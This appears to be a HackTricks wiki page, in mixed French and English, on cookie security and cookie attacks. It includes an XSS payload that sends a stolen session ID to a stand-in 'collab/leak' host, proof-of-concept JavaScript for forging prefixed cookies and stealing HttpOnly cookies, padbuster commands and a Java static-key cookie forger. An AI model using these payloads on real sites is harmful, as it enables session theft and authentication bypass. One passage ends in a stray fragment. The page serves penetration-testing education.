# Cookies Hacking

{{#include ../../banners/hacktricks-training.md}}

## Attributs des cookies

Cookies viennent avec plusieurs attributs qui contrôlent leur comportement dans le navigateur de l'utilisateur. Voici un aperçu de ces attributs, présenté de manière plus passive :

### Expires and Max-Age

La date d'expiration d'un cookie est déterminée par l'attribut `Expires`. À l'inverse, l'attribut `Max-age` définit le temps en secondes avant la suppression d'un cookie. **Privilégier `Max-age` car il reflète des pratiques plus modernes.**

### Domain

Les hôtes devant recevoir un cookie sont spécifiés par l'attribut `Domain`. Par défaut, ceci est réglé sur l'hôte qui a émis le cookie, sans inclure ses sous-domaines. Cependant, lorsque l'attribut `Domain` est explicitement défini, il englobe également les sous-domaines. Cela rend la spécification de l'attribut `Domain` une option moins restrictive, utile lorsque le partage de cookie entre sous-domaines est nécessaire. Par exemple, définir `Domain=mozilla.org` rend les cookies accessibles sur ses sous-domaines comme `developer.mozilla.org`.

### Path

Un chemin URL spécifique qui doit être présent dans l'URL demandée pour que l'en-tête `Cookie` soit envoyé est indiqué par l'attribut `Path`. Cet attribut considère le caractère `/` comme séparateur de répertoire, permettant des correspondances dans les sous-répertoires également.

### Ordering Rules

Quand deux cookies portent le même nom, celui choisi pour l'envoi est basé sur :

- Le cookie correspondant au plus long chemin dans l'URL demandée.
- Le cookie le plus récemment défini si les chemins sont identiques.

### SameSite

- L'attribut `SameSite` dicte si les cookies sont envoyés sur des requêtes provenant de domaines tiers. Il propose trois paramètres :
- **Strict** : Empêche l'envoi du cookie sur des requêtes provenant de tiers.
- **Lax** : Autorise l'envoi du cookie avec des requêtes GET initiées par des sites tiers.
- **None** : Permet l'envoi du cookie depuis n'importe quel domaine tiers.

En configurant les cookies, comprendre ces attributs aide à s'assurer qu'ils se comportent comme prévu dans différents scénarios.

| **Type de requête** | **Exemple de code**               | **Cookies envoyés lorsque** |
| ------------------- | ---------------------------------- | --------------------------- |
| Link                | \<a href="...">\</a>               | NotSet\*, Lax, None         |
| Prerender           | \<link rel="prerender" href=".."/> | NotSet\*, Lax, None         |
| Form GET            | \<form method="GET" action="...">  | NotSet\*, Lax, None         |
| Form POST           | \<form method="POST" action="..."> | NotSet\*, None              |
| iframe              | \<iframe src="...">\</iframe>      | NotSet\*, None              |
| AJAX                | $.get("...")                       | NotSet\*, None              |
| Image               | \<img src="...">                   | NetSet\*, None              |

Tableau tiré de [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) et légèrement modifié.\
Un cookie avec l'attribut _**SameSite**_ permettra d'**atténuer les attaques CSRF** lorsqu'une session authentifiée est nécessaire.

**\*Remarque : depuis Chrome80 (feb/2019) le comportement par défaut d'un cookie sans attribut SameSite sera lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).\
Remarquer qu'à titre temporaire, après l'application de ce changement, les **cookies sans politique SameSite** dans Chrome seront **traités comme None** pendant les **2 premières minutes**, puis comme **Lax** pour les requêtes POST cross-site de premier niveau.

## Flags des cookies

### HttpOnly

Cela empêche le **client** d'accéder au cookie (Via **Javascript** par exemple : `document.cookie`)

#### **Contournements**

- Si la page renvoie les cookies dans la réponse d'une requête (par exemple sur une page **PHPinfo**), il est possible d'abuser d'un **XSS** pour envoyer une requête vers cette page et **voler les cookies** depuis la réponse (voir un exemple sur [https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)).
- Cela peut être contourné avec des requêtes **TRACE HTTP** car la réponse du serveur (si cette méthode HTTP est disponible) reflétera les cookies envoyés. Cette technique est appelée **Cross-Site Tracking**.
- Les navigateurs modernes évitent cette technique en n'autorisant pas l'envoi d'une requête **TRACE** depuis JS. Cependant, certains contournements ont été trouvés dans des logiciels spécifiques, comme l'envoi de `\r\nTRACE` au lieu de `TRACE` vers **IE6.0 SP2**.
- Une autre voie est l'exploitation de vulnérabilités **zero/day** des navigateurs.
- Il est possible d'écraser des cookies HttpOnly en réalisant une attaque de Cookie Jar overflow :


{{#ref}}
cookie-jar-overflow.md
{{#endref}}

- Il est possible d'utiliser une attaque [**Cookie Smuggling**](#cookie-smuggling) pour exfiltrer ces cookies
- Si un endpoint côté serveur renvoie l'ID de session brut dans la réponse HTTP (par ex., à l'intérieur de commentaires HTML ou d'un bloc de debug), vous pouvez contourner HttpOnly en utilisant un gadget **XSS** pour récupérer cet endpoint, extraire le secret avec une **regex**, et l'exfiltrer. Exemple de pattern de payload XSS :
```js
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
.then(r => r.text())
.then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### Sécurisé

La requête n'enverra **uniquement** le cookie dans une requête HTTP que si celle-ci est transmise via un canal sécurisé (typiquement **HTTPS**).

## Préfixes de cookies

Les cookies préfixés par `__Secure-` doivent être définis avec le flag `secure` depuis des pages sécurisées par HTTPS.

Pour les cookies préfixés par `__Host-`, plusieurs conditions doivent être remplies :

- Ils doivent être définis avec le flag `secure`.
- Ils doivent provenir d'une page sécurisée par HTTPS.
- Ils ne doivent pas spécifier de domaine, empêchant leur transmission vers des sous-domaines.
- Le path pour ces cookies doit être défini sur `/`.

Il est important de noter que les cookies préfixés par `__Host-` ne sont pas autorisés à être envoyés vers des super-domaines ou des sous-domaines. Cette restriction aide à isoler les cookies de l'application. Ainsi, employer le préfixe `__Host-` pour tous les cookies de l'application peut être considéré comme une bonne pratique pour renforcer la sécurité et l'isolation.

### Écrasement des cookies

Ainsi, l'une des protections des cookies préfixés par `__Host-` est d'empêcher qu'ils soient écrasés depuis des sous-domaines. Empêchant par exemple [**Cookie Tossing attacks**](cookie-tossing.md). Dans la talk [**Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg) ([**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf)) il est présenté qu'il était possible de définir des cookies préfixés \_\_HOST- depuis un sous-domaine en trompant le parser, par exemple en ajoutant "=" au début, ou au début et à la fin...:

<figure><img src="../../images/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ou en PHP il était possible d'ajouter **d'autres caractères au début** du nom du cookie qui allaient être **remplacés par des caractères de soulignement**, permettant d'écraser des cookies `__HOST-` :

<figure><img src="../../images/image (7) (1) (1) (1) (1).png" alt="" width="373"><figcaption></figcaption></figure>


#### Unicode whitespace cookie-name smuggling (prefix forgery)

Abuser des divergences entre le parsing du navigateur et du serveur en préfixant le nom du cookie par un point de code d'espace Unicode. Le navigateur ne considérera pas que le nom commence littéralement par `__Host-`/`__Secure-`, et permettra donc la définition depuis un sous-domaine. Si le backend supprime/normalise les espaces Unicode initiaux sur les clés de cookie, il verra le nom protégé et pourra écraser le cookie à privilèges élevés.

- PoC depuis un sous-domaine capable de définir des cookies du domaine parent :
```js
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```
- Comportement typique du backend qui permet le problème :
- Frameworks qui tronquent/normalisent les clés de cookie. In Django, Python’s `str.strip()` supprime une large gamme de points de code d'espaces Unicode, provoquant la normalisation du nom en `__Host-name`.
- Les points de code couramment tronqués incluent : U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).
- De nombreux frameworks résolvent les noms de cookie dupliqués selon le principe « le dernier gagne », donc la valeur de cookie normalisée contrôlée par l'attaquant écrase la valeur légitime.

- Les différences entre navigateurs sont importantes :
- Safari bloque les espaces Unicode multioctets dans les noms de cookie (par ex., rejette U+2000) mais permet toujours les octets simples U+0085 et U+00A0, que beaucoup de backends tronquent. Testez sur plusieurs navigateurs.

- Impact : Permet d'écraser les cookies `__Host-`/`__Secure-` depuis des contextes moins fiables (sous-domaines), ce qui peut conduire à XSS (si réfléchi), override du token CSRF, et session fixation.

- On-the-wire vs server view example (U+2000 present in name):
```
Cookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;
```
De nombreux backends découpent/analyzent puis tronquent, ce qui fait que le `__Host-name` normalisé prend la valeur de l’attaquant.

#### Legacy `$Version=1` cookie splitting sur les backends Java (contournement de préfixe)

Certaines stacks Java (p. ex., Tomcat/Jetty-style) activent encore l'analyse héritée RFC 2109/2965 lorsque l'en-tête `Cookie` commence par `$Version=1`. Cela peut amener le serveur à réinterpréter une seule chaîne de cookie comme plusieurs cookies logiques et accepter une entrée `__Host-` forgée qui avait été initialement définie depuis un sous-domaine ou même via une origine non sécurisée.

- PoC forcing legacy parsing:
```js
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```
- Why it works:
- Les vérifications de préfixe côté client s'appliquent lors de l'enregistrement, mais l'analyse legacy côté serveur divise et normalise ensuite l'en-tête, contournant l'intention des garanties de préfixe `__Host-`/`__Secure-`.

- Where to try: Tomcat, Jetty, Undertow, or frameworks that still honor RFC 2109/2965 attributes. Combine with duplicate-name overwrite semantics.

#### Duplicate-name last-wins overwrite primitive

When two cookies normalize to the same name, many backends (including Django) use the last occurrence. After smuggling/legacy-splitting produces two `__Host-*` names, the attacker-controlled one will typically win.

#### Détection et outils

Utilisez Burp Suite pour tester ces conditions :

- Testez plusieurs points de code d'espaces Unicode en tête : U+2000, U+0085, U+00A0 et observez si le backend tronque et traite le nom comme préfixé.
- Envoyez `$Version=1` en premier dans l'en-tête Cookie et vérifiez si le backend effectue legacy splitting/normalization.
- Observez la résolution des noms dupliqués (first vs last wins) en injectant deux cookies qui normalisent au même nom.
- Burp Custom Action to automate this: [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

> Tip: These techniques exploit RFC 6265’s octet-vs-string gap: browsers send bytes; servers decode and may normalize/trim. Mismatches in decoding and normalization are the core of the bypass.

## Cookies Attacks

Si un cookie personnalisé contient des données sensibles, vérifiez-le (surtout si vous participez à un CTF), car il pourrait être vulnérable.

### Decoding and Manipulating Cookies

Les données sensibles intégrées dans les cookies doivent toujours être examinées. Les cookies encodés en Base64 ou formats similaires peuvent souvent être décodés. Cette vulnérabilité permet à un attaquant d'altérer le contenu du cookie et d'usurper d'autres utilisateurs en ré-encodant leurs données modifiées dans le cookie.

### Session Hijacking

This attack involves stealing a user's cookie to gain unauthorized access to their account within an application. By using the stolen cookie, an attacker can impersonate the legitimate user.

### Session Fixation

Dans ce scénario, un attaquant trompe une victime pour qu'elle utilise un cookie spécifique pour se connecter. Si l'application n'attribue pas un nouveau cookie lors de la connexion, l'attaquant, en possession du cookie original, peut usurper la victime. Cette technique repose sur le fait que la victime se connecte avec un cookie fourni par l'attaquant.

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### Session Donation

Ici, l'attaquant convainc la victime d'utiliser le cookie de session de l'attaquant. La victime, croyant être connectée à son propre compte, effectuera involontairement des actions dans le contexte du compte de l'attaquant.

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### [JWT Cookies](../hacking-jwt-json-web-tokens.md)

Cliquez sur le lien précédent pour accéder à une page expliquant les failles possibles dans JWT.

JSON Web Tokens (JWT) used in cookies can also present vulnerabilities. For in-depth information on potential flaws and how to exploit them, accessing the linked document on hacking JWT is recommended.

### Cross-Site Request Forgery (CSRF)

Cette attaque force un utilisateur authentifié à exécuter des actions non désirées sur une application web où il est actuellement authentifié. Les attaquants peuvent exploiter des cookies envoyés automatiquement avec chaque requête vers le site vulnérable.

### Cookies vides

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Les navigateurs permettent la création de cookies sans nom, ce qui peut être démontré via JavaScript comme suit:
```js
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
Le résultat dans l'en-tête cookie envoyé est `a=v1; test value; b=v2;`. Fait intéressant, cela permet de manipuler des cookies si un cookie au nom vide est défini, pouvant potentiellement contrôler d'autres cookies en définissant le cookie vide sur une valeur spécifique :
```js
function setCookie(name, value) {
document.cookie = `${name}=${value}`
}

setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
Cela conduit le navigateur à envoyer un cookie header interprété par chaque serveur web comme un cookie nommé `a` avec une valeur `b`.

#### Bug Chrome : problème de point de code suppléant Unicode

Dans Chrome, si un point de code suppléant Unicode fait partie d'un set cookie, `document.cookie` devient corrompu et renvoie ensuite une chaîne vide :
```js
document.cookie = "\ud800=meep"
```
Cela fait que `document.cookie` renvoie une chaîne vide, indiquant une corruption permanente.

#### Cookie Smuggling en raison de problèmes d'analyse

(Pour plus de détails, voir le[original research](https://blog.ankursundara.com/cookie-bugs/)) Plusieurs serveurs web, notamment ceux pour Java (Jetty, TomCat, Undertow) et Python (Zope, cherrypy, web.py, aiohttp, bottle, webob), traitent incorrectement les cookie strings en raison d'un support obsolète de RFC2965. Ils interprètent une valeur de cookie entre guillemets doubles comme une seule valeur même si elle contient des points-virgules, qui devraient normalement séparer les paires clé-valeur :
```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Cookie Injection Vulnerabilities

(Consultez plus de détails dans le [original research](https://blog.ankursundara.com/cookie-bugs/)) L'analyse incorrecte des cookies par certains serveurs, notamment Undertow, Zope et ceux utilisant les classes Python `http.cookie.SimpleCookie` et `http.cookie.BaseCookie`, crée des opportunités d'attaque par injection de cookie. Ces serveurs ne délimitent pas correctement le début des nouveaux cookies, permettant aux attaquants de falsifier des cookies :

- Undertow attend un nouveau cookie immédiatement après une valeur entre guillemets sans point-virgule.
- Zope recherche une virgule pour commencer à parser le cookie suivant.
- Les classes cookie de Python commencent le parsing sur un caractère espace.

Cette vulnérabilité est particulièrement dangereuse pour les applications web qui reposent sur une protection CSRF basée sur les cookies, car elle permet aux attaquants d'injecter des cookies CSRF-token falsifiés et de potentiellement contourner les mesures de sécurité. Le problème est aggravé par la gestion des noms de cookie dupliqués en Python, où la dernière occurrence remplace les précédentes. Cela pose aussi des problèmes pour les cookies __Secure- et __Host- dans des contextes non sécurisés et peut conduire à des contournements d'autorisation lorsque les cookies sont transmis à des serveurs back-end vulnérables au spoofing.

### Cookies $version

#### WAF Bypass

According to [**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), il peut être possible d'utiliser l'attribut de cookie **`$Version=1`** pour faire en sorte que le backend utilise une ancienne logique de parsing du cookie à cause du **RFC2109**. De plus, d'autres valeurs comme **`$Domain`** et **`$Path`** peuvent être utilisées pour modifier le comportement du backend via le cookie.

#### Cookie Sandwich Attack

According to [**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) il est possible d'utiliser la cookie sandwich technique pour voler des HttpOnly cookies. Voici les prérequis et les étapes :

- Trouver un endroit où un cookie apparemment inutile est reflété dans la réponse
- **Create a cookie called `$Version`** with value `1` (vous pouvez le faire via une XSS en JS) avec un path plus spécifique pour qu'il obtienne la position initiale (certains frameworks comme python n'ont pas besoin de cette étape)
- **Create the cookie that is reflected** avec une valeur qui laisse une **double quote ouverte** et avec un path spécifique pour qu'il soit positionné dans la base de cookies après le précédent (`$Version`)
- Ensuite, le cookie légitime sera placé ensuite dans l'ordre
- **Create a dummy cookie that closes the double quotse** à l'intérieur de sa valeur

De cette manière, le cookie de la victime est piégé à l'intérieur du nouveau cookie version 1 et sera reflété chaque fois qu'il est renvoyé.
e.g. from the post:
```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### Contournements WAF

#### Cookies $version

Voir la section précédente.

#### Bypassing value analysis with quoted-string encoding

Ce parsing indique de déséchapper les valeurs échappées à l'intérieur des cookies, donc "\a" devient "a". Ceci peut être utile pour bypasser les WAFS comme :

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### Bypassing cookie-name blocklists

Dans la RFC2109 il est indiqué qu'une **virgule peut être utilisée comme séparateur entre cookie values**. Il est aussi possible d'ajouter **espaces et tabulations avant et après le signe égal**. Donc un cookie comme `$Version=1; foo=bar, abc = qux` ne génère pas le cookie `"foo":"bar, admin = qux"` mais les cookies `"foo":"bar"` et `"admin":"qux"`. Remarquez comment 2 cookies sont générés et comment admin s'est vu retirer les espaces avant et après le signe égal.

#### Bypassing value analysis with cookie splitting

Enfin, différents backdoors joindraient dans une chaîne différents cookies passés dans différents cookie headers comme dans :
```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
Ce qui pourrait permettre de bypasser un WAF comme dans cet exemple :
```
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```
### Extra Vulnerable Cookies Checks

#### **Vérifications de base**

- Le **cookie** est le **même** à chaque **login**.
- Déconnectez-vous et essayez d'utiliser le même cookie.
- Essayez de log in depuis 2 appareils (ou navigateurs) sur le même compte en utilisant le même cookie.
- Vérifiez si le cookie contient des informations et essayez de le modifier.
- Essayez de créer plusieurs comptes avec des usernames presque identiques et vérifiez si vous pouvez voir des similitudes.
- Vérifiez l'option "**remember me**" si elle existe pour voir comment elle fonctionne. Si elle existe et peut être vulnérable, utilisez toujours le cookie de **remember me** sans aucun autre cookie.
- Vérifiez si le cookie précédent fonctionne même après avoir changé le mot de passe.

#### **Advanced cookies attacks**

Si le cookie reste le même (ou presque) lorsque vous log in, cela signifie probablement que le cookie est lié à un champ de votre compte (probablement le username). Ensuite vous pouvez :

- Essayez de créer de nombreux **accounts** avec des **usernames** très **similaires** et tentez de **guess** comment l'algorithme fonctionne.
- Essayez de **bruteforce the username**. Si le cookie sert uniquement comme méthode d'authentification pour votre username, alors vous pouvez créer un compte avec le username "**Bmin**" et **bruteforce** chaque **bit** de votre cookie car l'un des cookies que vous testerez sera celui appartenant à "**admin**".
- Essayez **Padding** **Oracle** (vous pouvez déchiffrer le contenu du cookie). Utilisez **padbuster**.

**Padding Oracle - Padbuster examples**
```bash
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Padbuster effectuera plusieurs tentatives et vous demandera quelle condition correspond à l'erreur (celle qui n'est pas valide).

Ensuite, il commencera à decrypting the cookie (cela peut prendre plusieurs minutes)

Si l'attaque a réussi, vous pouvez alors essayer d'**encrypt** une chaîne de votre choix. Par exemple, si vous souhaitez **encrypt** **user=administrator**
```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
Cette exécution vous donnera le cookie correctement chiffré et encodé contenant la chaîne **user=administrator** inside.

**CBC-MAC**

Maybe un cookie could have some value and could be signed using CBC. Then, l'intégrité de la valeur est la signature créée en utilisant CBC avec la même valeur. As it is recommended to use as IV un vecteur nul, ce type de vérification d'intégrité pourrait être vulnérable.

**L'attaque**

1. Obtenir la signature du username **administ** = **t**
2. Obtenir la signature du username **rator\x00\x00\x00 XOR t** = **t'**
3. Placer dans le cookie la valeur **administrator+t'** (**t'** sera une signature valide de **(rator\x00\x00\x00 XOR t) XOR t** = **rator\x00\x00\x00**

**ECB**

If the cookie is encrypted using ECB it could be vulnerable.\
When you log in the cookie that you receive has to be always the same.

**Comment détecter et attaquer :**

Créer 2 users avec presque les mêmes données (username, password, email, etc.) et essayer de découvrir un motif dans le cookie fourni

Créer un user appelé par exemple "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" et vérifier s'il y a un motif dans le cookie (as ECB encrypts with the same key every block, the same encrypted bytes could appear if the username is encrypted).

Il devrait y avoir un motif (avec la taille d'un bloc utilisé). Donc, connaissant comment un ensemble de "a" est chiffré vous pouvez créer un username: "a"\*(size of the block)+"admin". Ensuite, vous pourriez supprimer le motif chiffré d'un bloc de "a" du cookie. Et vous aurez le cookie du username "admin".

### Static-key cookie forgery (symmetric encryption of predictable IDs)

Some applications mint authentication cookies by encrypting only a predictable value (e.g., the numeric user ID) under a global, hard-coded symmetric key, then encoding the ciphertext (hex/base64). If the key is static per product (or per install), anyone can forge cookies for arbitrary users offline and bypass authentication.

How to test/forge
- Identifier le(s) cookie(s) qui gate auth, e.g., COOKIEID and ADMINCOOKIEID.
- Déterminer le cipher/encoding. Dans un cas réel l'app utilisait IDEA avec une clé constante de 16-byte et retournait le ciphertext as hex.
- Vérifier en encrypting your own user ID et en comparant avec le cookie émis. Si ça correspond, you can mint cookies for any target ID (1 often maps to the first admin).
- Définir la valeur forgée directement comme cookie et naviguer; no credentials are needed.

<details>
<summary>Minimal Java PoC (IDEA + hex) used in the wild</summary>
```java
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
private String ideaKey = "1234567890123456"; // example static key

public String encode(char[] plainArray) { return encode(new String(plainArray)); }

public String encode(String plain) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA encrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
encrypt.initEncrypt(key);
} catch (KeyException e) { return null; }
if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
plain = plain + " "; // space padding
}
}
byte[] encrypted = encrypt.update(plain.getBytes());
return Hex.toString(encrypted); // cookie expects hex
}

public String decode(String chiffre) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA decrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
decrypt.initDecrypt(key);
} catch (KeyException e) { return null; }
byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
}

public void setKey(String key) { this.ideaKey = key; }
}
```
</details>contexte (par ex., session côté serveur avec un ID aléatoire, ou ajouter des propriétés anti-replay).

## Références

- [Quand les audits échouent : quatre vulnérabilités pré-auth critiques dans TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://blog.ankursundara.com/cookie-bugs/](https://blog.ankursundara.com/cookie-bugs/)
- [https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
- [https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [https://seclists.org/webappsec/2006/q2/181](https://seclists.org/webappsec/2006/q2/181)
- [https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [Cookie Chaos : Comment contourner les préfixes __Host et __Secure des cookies](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [Burp Custom Action – CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

{{#include ../../banners/hacktricks-training.md}}
